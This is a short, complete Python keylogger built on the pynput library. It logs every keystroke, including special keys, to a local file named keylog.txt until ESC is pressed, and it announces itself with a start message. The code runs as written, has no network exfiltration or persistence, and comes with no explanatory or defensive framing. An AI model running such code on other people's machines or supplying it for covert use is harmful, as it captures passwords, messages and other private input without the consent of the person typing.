from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == Key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == Key.enter:
            with open(log_file, "a") as f:
                f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write("[" + str(key) + "]")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press ESC to stop.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
